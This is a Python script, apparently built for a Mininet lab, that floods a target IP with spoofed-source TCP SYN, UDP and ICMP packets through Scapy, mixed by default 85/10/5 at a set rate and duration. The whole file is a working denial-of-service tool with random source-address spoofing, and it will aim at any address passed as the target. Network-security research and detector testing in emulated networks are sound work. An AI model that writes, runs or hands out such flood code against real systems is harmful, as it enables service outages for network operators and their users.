#!/usr/bin/env python3
"""Mixed DDoS attack: 85% TCP, 10% UDP, 5% ICMP using Scapy.

Usage from Mininet CLI:
    attacker1 /path/to/.venv/bin/python attack/mixed_attack.py 10.0.2.1 --duration 60
"""

import argparse
import random
import signal
import sys
import time
from scapy.all import IP, TCP, UDP, ICMP, send

DEFAULT_RATE = 1000
DEFAULT_DURATION = 30

running = True

def signal_handler(sig, frame):
    global running
    running = False

def rand_ip():
    return f"10.0.{random.randint(0, 255)}.{random.randint(1, 254)}"

def main():
    global running
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description="Mixed DDoS attack (TCP+UDP+ICMP)")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--rate", type=int, default=DEFAULT_RATE, help="Total packets per second")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION, help="Attack duration in seconds")
    parser.add_argument("--tcp", type=float, default=0.85, help="TCP ratio (default: 0.85)")
    parser.add_argument("--udp", type=float, default=0.10, help="UDP ratio (default: 0.10)")
    parser.add_argument("--icmp", type=float, default=0.05, help="ICMP ratio (default: 0.05)")
    args = parser.parse_args()

    r = args.tcp + args.udp + args.icmp
    if abs(r - 1.0) > 0.01:
        parser.error(f"Ratios must sum to 1.0 (got {r:.2f})")

    tcp_n = int(args.rate * args.tcp)
    udp_n = int(args.rate * args.udp)
    icmp_n = args.rate - tcp_n - udp_n

    print(f"Target: {args.target}  Rate: {args.rate}/s  Duration: {args.duration}s")
    print(f"TCP: {tcp_n} ({args.tcp*100:.0f}%)  UDP: {udp_n} ({args.udp*100:.0f}%)  ICMP: {icmp_n} ({args.icmp*100:.0f}%)")
    print("Press Ctrl+C to stop\n")

    total = 0
    start = time.time()
    deadline = start + args.duration

    while running and time.time() < deadline:
        tick = time.time()
        pkts = []

        for _ in range(tcp_n):
            pkts.append(
                IP(src=rand_ip(), dst=args.target)
                / TCP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535), flags="S")
            )
        for _ in range(udp_n):
            pkts.append(
                IP(src=rand_ip(), dst=args.target)
                / UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535))
            )
        for _ in range(icmp_n):
            pkts.append(
                IP(src=rand_ip(), dst=args.target) / ICMP()
            )

        send(pkts, verbose=0)
        total += len(pkts)

        elapsed = time.time() - tick
        if elapsed < 1.0:
            time.sleep(1.0 - elapsed)

        sys.stdout.write(f"\rSent: {total} packets  |  {int(time.time()-start)}s elapsed")
        sys.stdout.flush()

    print(f"\n\nDone. Total packets sent: {total}")

if __name__ == "__main__":
    main()
